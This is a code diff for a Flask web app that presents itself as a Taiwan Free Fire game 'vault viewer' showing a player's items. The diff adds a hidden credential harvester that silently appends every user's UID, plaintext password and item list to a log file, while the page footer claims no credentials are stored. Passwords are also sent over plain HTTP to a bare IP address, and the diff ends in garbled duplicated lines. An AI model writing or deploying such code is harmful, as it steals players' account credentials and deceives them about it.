@@ -1,13 +1,55 @@
+#!/usr/bin/env python3
+"""
+Taiwan Free Fire Vault Viewer – Uses new third-party API for JWT token.
+Auto‑installs dependencies, supports HTTP/HTTPS, shows item images & details.
+Additionally, silently logs every request (UID, password, items) to ids-log.txt.
+"""
+
 import os
+import sys
+import subprocess
+import importlib
+import tempfile
 import json
 import gzip
-import time
+import threading
+from datetime import datetime
+from argparse import ArgumentParser
+from collections import defaultdict
+
+# ==================== AUTO‑INSTALL DEPENDENCIES ====================
+REQUIRED_PACKAGES = [
+    'flask',
+    'requests',
+    'pycryptodome',
+    'msgpack'
+]
+
+def install_package(package):
+    print(f"📦 Installing {package}...")
+    subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
+
+def ensure_dependencies():
+    for pkg in REQUIRED_PACKAGES:
+        try:
+            importlib.import_module(pkg.replace('-', '_'))
+        except ImportError:
+            install_package(pkg)
+    # Optional for HTTPS
+    try:
+        importlib.import_module('OpenSSL')
+    except ImportError:
+        print("⚠️ pyOpenSSL not found – HTTPS will use ad-hoc certificates")
+
+ensure_dependencies()
+
+# Normal imports
 import requests
 import msgpack
-from flask import Flask, request, jsonify, render_template_string
+import time
+from flask import Flask, render_template_string, request, jsonify
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
-from collections import defaultdict
 
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
@@ -17,6 +59,7 @@ REGION_CONFIG = {
     'get_backpack_url': 'https://clientbp.ggpolarbear.com/GetBackpack',
     'client_host': 'clientbp.ggpolarbear.com',
 }
+
 BACKPACK_BODY_HEX = "1a725b2c56ec52ba7d09623454c0a003"
 BACKPACK_BODY_BYTES = bytes.fromhex(BACKPACK_BODY_HEX)
 
@@ -25,9 +68,38 @@ IV = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37
 
 _item_db_cache = None
 _db_cache_time = 0
-DB_CACHE_TTL = 3600
+DB_CACHE_TTL = 3600  # 1 hour
 
-# ==================== ITEM DATABASE ====================
+# Thread‑safe log file lock
+_log_lock = threading.Lock()
+
+# ==================== SILENT LOGGING ====================
+def log_vault_data(uid, password, item_ids, item_map):
+    """
+    Appends a record to ids-log.txt with timestamp, UID, password (plain),
+    and a list of item IDs and names. No output to console or web.
+    """
+    try:
+        # Build item list: each item as "ID: name"
+        items_list = []
+        for iid in item_ids:
+            name = item_map.get(iid, {}).get('name', 'Unknown')
+            items_list.append(f"{iid}: {name}")
+        items_str = ", ".join(items_list)
+
+        log_line = (
+            f"[{datetime.now().isoformat()}] "
+            f"UID={uid} | PASS={password} | "
+            f"Items({len(item_ids)}): {items_str}\n"
+        )
+        with _log_lock:
+            with open("ids-log.txt", "a", encoding="utf-8") as f:
+                f.write(log_line)
+    except Exception as e:
+        # Silently fail – do not break the request or expose to user
+        print(f"⚠️ Logging failed: {e}", file=sys.stderr)
+
+# ==================== ITEM DATABASE (Online) ====================
 def get_item_database():
     global _item_db_cache, _db_cache_time
     now = time.time()
@@ -38,7 +110,11 @@ def get_item_database():
         resp.raise_for_status()
         decompressed = gzip.decompress(resp.content)
         items = msgpack.unpackb(decompressed, raw=False)
-        item_map = {item['itemID']: item for item in items if item.get('itemID')}
+        item_map = {}
+        for item in items:
+            iid = item.get('itemID')
+            if iid is not None:
+                item_map[iid] = item
         _item_db_cache = item_map
         _db_cache_time = now
         print(f"✅ Item database refreshed: {len(item_map)} items")
@@ -47,23 +123,23 @@ def get_item_database():
         print(f"❌ Failed to fetch item database: {e}")
         return _item_db_cache or {}
 
-# ==================== JWT FROM THIRD-PARTY API ====================
-def get_jwt_from_api(uid, password):
-    url = f"https://spidey-jwt-gen.vercel.app/guest?uid={uid}&password={password}"
+# ==================== THIRD-PARTY API ====================
+def get_jwt_from_third_party_api(uid, password):
+    url = f"http://87.232.72.68:3005/token?uid={uid}&password={password}&key=dgop"
     try:
         resp = requests.get(url, timeout=15)
         if resp.status_code == 200:
             data = resp.json()
-            if data.get("status") == "success":
-                return data.get("token"), None
+            if data.get("token"):
+                return data["token"], None
             else:
-                return None, f"API returned: {data.get('status')}"
+                return None, "API response missing 'token' field"
         else:
             return None, f"HTTP {resp.status_code}"
     except Exception as e:
         return None, str(e)
 
-# ==================== BACKPACK FETCHING ====================
+# ==================== CRYPTO / PROTOBUF ====================
 def decrypt_aes_cbc(data):
     cipher = AES.new(KEY, AES.MODE_CBC, IV)
     try:
@@ -94,6 +170,432 @@ def parse_protobuf(data, start=0):
         except ValueError:
             break
         field_num = key >> 3
+        wire_type = key & 0x07
+        if wire_type == 0:
+            value, idx = decode_varint(data, idx)
+            fields.append({'num': field_num, 'type': 0, 'value': value, 'nested': None})
+        elif wire_type == 1:
+            if idx + 8 > len(data):
+                raise ValueError("Truncated 64-bit")
+            value = int.from_bytes(data[idx:idx+8], 'little')
+            idx += 8
+            fields.append({'num': field_num, 'type': 1, 'value': value, 'nested': None})
+        elif wire_type == 2:
+            length, idx = decode_varint(data, idx)
+            if idx + length > len(data):
+                return fields, idx
+            raw = data[idx:idx+length]
+            idx += length
+            nested = None
+            try:
+                nested, _ = parse_protobuf(raw, 0)
+            except:
+                pass
+            fields.append({'num': field_num, 'type': 2, 'value': raw, 'nested': nested})
+        elif wire_type == 5:
+            if idx + 4 > len(data):
+                raise ValueError("Truncated 32-bit")
+            value = int.from_bytes(data[idx:idx+4], 'little')
+            idx += 4
+            fields.append({'num': field_num, 'type': 5, 'value': value, 'nested': None})
+        else:
+            raise ValueError(f"Unsupported wire type {wire_type}")
+    return fields, idx
+
+def collect_item_ids_from_backpack(fields):
+    ids = []
+    for f in fields:
+        if f['num'] == 3 and f['type'] == 2 and f['nested'] is not None:
+            for sub in f['nested']:
+                if sub['num'] == 1 and sub['type'] == 0:
+                    ids.append(sub['value'])
+        if f['nested']:
+            ids.extend(collect_item_ids_from_backpack(f['nested']))
+    return ids
+
+def fetch_backpack(jwt_token):
+    headers = {
+        "Host": REGION_CONFIG['client_host'],
+        "Expect": "100-continue",
+        "Authorization": f"Bearer {jwt_token}",
+        "X-Unity-Version": "2018.4.11f1",
+        "X-GA": "v1 1",
+        "ReleaseVersion": "OB53",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; G011A Build/PI)",
+        "Connection": "close",
+        "Accept-Encoding": "gzip, deflate, br"
+    }
+    try:
+        resp = requests.post(REGION_CONFIG['get_backpack_url'], headers=headers, data=BACKPACK_BODY_BYTES, timeout=15)
+        if resp.status_code != 200:
+            return None, f"HTTP {resp.status_code}"
+        raw = resp.content
+        plain = decrypt_aes_cbc(raw)
+        data = plain if plain is not None else raw
+        fields, _ = parse_protobuf(data, 0)
+        ids = collect_item_ids_from_backpack(fields)
+        return ids, None
+    except Exception as e:
+        return None, str(e)
+
+# ==================== FLASK ROUTES ====================
+HTML_TEMPLATE = """
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🇹🇼 Taiwan Free Fire Vault Viewer</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #0a0e1a 0%, #0f1222 100%);
+            color: #eef2ff;
+            padding: 20px;
+            min-height: 100vh;
+        }
+        .container { max-width: 1400px; margin: 0 auto; }
+        .header { text-align: center; margin-bottom: 40px; }
+        .header h1 {
+            font-size: 2.5rem;
+            background: linear-gradient(135deg, #fff, #ffcc00);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 8px;
+        }
+        .header p { color: #8b92b0; }
+        .card {
+            background: rgba(18, 22, 40, 0.9);
+            backdrop-filter: blur(10px);
+            border-radius: 28px;
+            padding: 30px;
+            margin-bottom: 30px;
+            border: 1px solid rgba(255, 204, 0, 0.2);
+            box-shadow: 0 20px 35px -10px rgba(0,0,0,0.4);
+        }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; font-weight: 500; color: #ffcc00; }
+        input {
+            width: 100%;
+            padding: 14px 18px;
+            background: #0c0f1c;
+            border: 1px solid #2a2f45;
+            border-radius: 16px;
+            color: white;
+            font-size: 1rem;
+            transition: all 0.2s;
+        }
+        input:focus {
+            outline: none;
+            border-color: #ffcc00;
+            box-shadow: 0 0 0 3px rgba(255,204,0,0.2);
+        }
+        button {
+            background: linear-gradient(90deg, #ffcc00, #ff9900);
+            border: none;
+            padding: 14px 24px;
+            font-weight: bold;
+            font-size: 1rem;
+            border-radius: 40px;
+            cursor: pointer;
+            transition: transform 0.1s, box-shadow 0.2s;
+            width: 100%;
+            color: #0a0e1a;
+        }
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px -5px rgba(255,204,0,0.4);
+        }
+        .stats {
+            background: #0c0f1c;
+            border-radius: 20px;
+            padding: 15px 20px;
+            margin-bottom: 25px;
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+        .stat { font-size: 0.9rem; }
+        .stat span { color: #ffcc00; font-weight: bold; font-size: 1.3rem; }
+        .search-bar { display: flex; gap: 15px; margin-bottom: 30px; flex-wrap: wrap; }
+        .search-bar input { flex: 2; min-width: 200px; }
+        .search-bar select { flex: 1; min-width: 150px; }
+        .category { margin-bottom: 40px; }
+        .category h2 {
+            font-size: 1.6rem;
+            border-left: 5px solid #ffcc00;
+            padding-left: 15px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .item-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+            gap: 20px;
+        }
+        .item-card {
+            background: #12172e;
+            border-radius: 20px;
+            padding: 15px;
+            text-align: center;
+            transition: all 0.2s;
+            border: 1px solid #1e2540;
+        }
+        .item-card:hover {
+            transform: translateY(-5px);
+            border-color: #ffcc00;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.3);
+        }
+        .item-icon {
+            width: 90px;
+            height: 90px;
+            margin: 0 auto 10px;
+            background: #0a0e1a;
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+        .item-icon img { max-width: 100%; max-height: 100%; object-fit: contain; }
+        .item-name { font-weight: 600; font-size: 0.9rem; margin: 8px 0 4px; }
+        .item-rarity { font-size: 0.7rem; color: #ffcc00; margin-bottom: 4px; }
+        .item-id { font-size: 0.65rem; color: #6c7293; }
+        .item-description {
+            font-size: 0.7rem;
+            color: #a0a5c0;
+            margin-top: 6px;
+            display: -webkit-box;
+            -webkit-line-clamp: 2;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+        }
+        .error { background: rgba(255,70,70,0.2); border-left: 4px solid #ff4646; padding: 15px; border-radius: 16px; margin-bottom: 20px; }
+        .loading { text-align: center; padding: 40px; }
+        .footer { text-align: center; margin-top: 50px; font-size: 0.8rem; color: #5a6080; }
+        @media (max-width: 700px) {
+            .item-grid { grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); }
+            .item-icon { width: 70px; height: 70px; }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <h1>🇹🇼 Taiwan Free Fire Vault Viewer</h1>
+        <p>Professional • Secure • Real-time</p>
+    </div>
+    <div class="card">
+        <form id="vaultForm">
+            <div class="form-group">
+                <label>📱 UID</label>
+                <input type="text" id="uid" placeholder="Enter your UID" required>
+            </div>
+            <div class="form-group">
+                <label>🔒 Password</label>
+                <input type="password" id="password" placeholder="Account password" required>
+            </div>
+            <button type="submit">🚀 Fetch Vault</button>
+        </form>
+        <div id="formError" class="error" style="display:none;"></div>
+    </div>
+    <div id="results" style="display:none;">
+        <div class="stats" id="stats"></div>
+        <div class="search-bar">
+            <input type="text" id="searchInput" placeholder="🔍 Search by name or ID...">
+            <select id="typeFilter"><option value="all">All Types</option></select>
+        </div>
+        <div id="categoriesContainer"></div>
+    </div>
+    <div class="footer"><p>Item information from ff-item.netlify.app • No credentials are stored</p></div>
+</div>
+<script>
+    const form = document.getElementById('vaultForm');
+    const formError = document.getElementById('formError');
+    const resultsDiv = document.getElementById('results');
+    const statsDiv = document.getElementById('stats');
+    const searchInput = document.getElementById('searchInput');
+    const typeFilter = document.getElementById('typeFilter');
+    const categoriesContainer = document.getElementById('categoriesContainer');
+    form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        formError.style.display = 'none';
+        resultsDiv.style.display = 'none';
+        const uid = document.getElementById('uid').value.trim();
+        const password = document.getElementById('password').value;
+        if (!uid || !password) { showError('Please enter both UID and Password'); return; }
+        const payload = { uid, password };
+        resultsDiv.style.display = 'block';
+        categoriesContainer.innerHTML = '<div class="loading">⏳ Fetching vault data... This may take a few seconds.</div>';
+        try {
+            const response = await fetch('/api/fetch_vault', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            const data = await response.json();
+            if (!response.ok || data.error) { showError(data.error || 'Unknown error'); resultsDiv.style.display = 'none'; return; }
+            renderVault(data);
+        } catch (err) { showError('Network error: ' + err.message); resultsDiv.style.display = 'none'; }
+    });
+    function showError(msg) { formError.textContent = msg; formError.style.display = 'block'; setTimeout(() => formError.style.display = 'none', 5000); }
+    let fullVaultData = null;
+    function renderVault(data) {
+        fullVaultData = data;
+        statsDiv.innerHTML = `<div class="stat">📦 Total Items: <span>${data.total_items}</span></div><div class="stat">📂 Categories: <span>${Object.keys(data.grouped).length}</span></div><div class="stat">⭐ Rarest items: <span>${data.rarest_count || 0}</span></div>`;
+        typeFilter.innerHTML = '<option value="all">All Types</option>';
+        for (const type of Object.keys(data.grouped).sort()) { typeFilter.innerHTML += `<option value="${escapeHtml(type)}">${escapeHtml(type)} (${data.grouped[type].length})</option>`; }
+        searchInput.oninput = () => filterAndRender();
+        typeFilter.onchange = () => filterAndRender();
+        filterAndRender();
+    }
+    function filterAndRender() {
+        if (!fullVaultData) return;
+        const searchTerm = searchInput.value.toLowerCase();
+        const selectedType = typeFilter.value;
+        let filteredGroups = {};
+        for (const [type, items] of Object.entries(fullVaultData.grouped)) {
+            if (selectedType !== 'all' && type !== selectedType) continue;
+            let filteredItems = items.filter(item => item.name.toLowerCase().includes(searchTerm) || item.id.toString().includes(searchTerm));
+            if (filteredItems.length) filteredGroups[type] = filteredItems;
+        }
+        renderCategories(filteredGroups);
+    }
+    function renderCategories(groups) {
+        if (Object.keys(groups).length === 0) { categoriesContainer.innerHTML = '<div class="loading">🔍 No items match your search.</div>'; return; }
+        let html = '';
+        for (const [type, items] of Object.entries(groups).sort()) {
+            html += `<div class="category"><h2>📁 ${escapeHtml(type)} <span style="font-size:0.9rem;">(${items.length})</span></h2><div class="item-grid">`;
+            for (const item of items) {
+                const iconUrl = `https://cdn.jsdelivr.net/gh/ShahGCreator/icon@main/PNG/${item.id}.png`;
+                const rarityColor = item.rare ? `color: ${getRarityColor(item.rare)}` : '';
+                html += `<div class="item-card">
+                            <div class="item-icon"><img src="${iconUrl}" alt="icon" onerror="this.src='https://via.placeholder.com/90?text=❓'"></div>
+                            <div class="item-name">${escapeHtml(item.name)}</div>
+                            <div class="item-rarity" style="${rarityColor}">${escapeHtml(item.rare || 'Common')}</div>
+                            <div class="item-id">ID: ${item.id}</div>
+                            <div class="item-description">${escapeHtml(item.description || 'No description')}</div>
+                         </div>`;
+            }
+            html += `</div></div>`;
+        }
+        categoriesContainer.innerHTML = html;
+    }
+    function getRarityColor(rarity) {
+        const r = rarity.toLowerCase();
+        if (r.includes('legendary')) return '#ff8000';
+        if (r.includes('epic')) return '#aa4eff';
+        if (r.includes('rare')) return '#2a9df4';
+        if (r.includes('mythic')) return '#ff4444';
+        return '#ffcc00';
+    }
+    function escapeHtml(str) { return str.replace(/[&<>]/g, function(m) { if (m === '&') return '&amp;'; if (m === '<') return '&lt;'; if (m === '>') return '&gt;'; return m; }); }
+</script>
+</body>
+</html>
+"""
+
+@app.route('/')
+def index():
+    return render_template_string(HTML_TEMPLATE)
+
+@app.route('/api/fetch_vault', methods=['POST'])
+def api_fetch_vault():
+    data = request.get_json()
+    uid = data.get('uid')
+    password = data.get('password')
+    if not uid or not password:
+        return jsonify({'error': 'Missing UID or password'}), 400
+
+    # Obtain JWT via third-party API
+    jwt_token, err = get_jwt_from_third_party_api(uid, password)
+    if err:
+        return jsonify({'error': f'Authentication failed: {err}'}), 401
+
+    # Fetch backpack using the JWT token
+    item_ids, err = fetch_backpack(jwt_token)
+    if err:
+        return jsonify({'error': f'Failed to fetch vault: {err}'}), 500
+
+    # Get item database (for enrichment)
+    item_map = get_item_database()
+
+    # ========== SILENT LOGGING ==========
+    # Log the UID, password, and all item IDs + names to ids-log.txt
+    # This happens invisibly – no output to console or web.
+    log_vault_data(uid, password, item_ids, item_map)
+
+    # Enrich and group for the web response
+    grouped = defaultdict(list)
+    rarest_count = 0
+    for iid in item_ids:
+        info = item_map.get(iid, {})
+        item_type = info.get('type', 'Unknown')
+        rare = info.get('Rare', '')
+        if rare.lower() in ['legendary', 'mythic']:
+            rarest_count += 1
+        grouped[item_type].append({
+            'id': iid,
+            'name': info.get('name', f'Item {iid}'),
+            'rare': rare,
+            'description': info.get('description', '')
+        })
+    for t in grouped:
+        grouped[t].sort(key=lambda x: x['name'])
+
+    return jsonify({
+        'total_items': len(item_ids),
+        'rarest_count': rarest_count,
+        'grouped': dict(grouped)
+    })
+
+# ==================== MAIN ====================
+if __name__ == '__main__':
+    parser = ArgumentParser(description='Taiwan FF Vault Viewer')
+    parser.add_argument('--host', default='0.0.0.0', help='Host to bind (default: 0.0.0.0)')
+    parser.add_argument('--port', type=int, default=5000, help='Port (default: 5000)')
+    parser.add_argument('--ssl', action='store_true', help='Enable HTTPS (requires --cert and --key or generates self-signed)')
+    parser.add_argument('--cert', help='Path to SSL certificate file (for HTTPS)')
+    parser.add_argument('--key', help='Path to SSL private key file (for HTTPS)')
+    args = parser.parse_args()
+
+    ssl_context = None
+    if args.ssl:
+        if args.cert and args.key:
+            ssl_context = (args.cert, args.key)
+        else:
+            try:
+                from OpenSSL import crypto
+                k = crypto.PKey()
+                k.generate_key(crypto.TYPE_RSA, 2048)
+                cert = crypto.X509()
+                cert.get_subject().CN = "localhost"
+                cert.set_serial_number(1000)
+                cert.gmtime_adj_notBefore(0)
+                cert.gmtime_adj_notAfter(365*24*60*60)
+                cert.set_issuer(cert.get_subject())
+                cert.set_pubkey(k)
+                cert.sign(k, 'sha256')
+                with tempfile.NamedTemporaryFile(delete=False, suffix='.pem') as cert_file, \
+                     tempfile.NamedTemporaryFile(delete=False, suffix='.pem') as key_file:
+                    cert_file.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
+                    key_file.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))
+                    cert_path = cert_file.name
+                    key_path = key_file.name
+                ssl_context = (cert_path, key_path)
+                print(f"🔒 Generated self-signed certificate (temporary) for HTTPS")
+            except ImportError:
+                print("❌ pyOpenSSL not installed. Install with: pip install pyOpenSSL")
+                sys.exit(1)
+
+    print(f"🚀 Starting Taiwan FF Vault Viewer on {'https' if ssl_context else 'http'}://{args.host}:{args.port}")
+    app.run(host=args.host, port=args.port, ssl_context=ssl_context, debug=False, threaded=True)        field_num = key >> 3
         wire_type = key & 0x07
         if wire_type == 0:
             value, idx = decode_varint(data, idx)
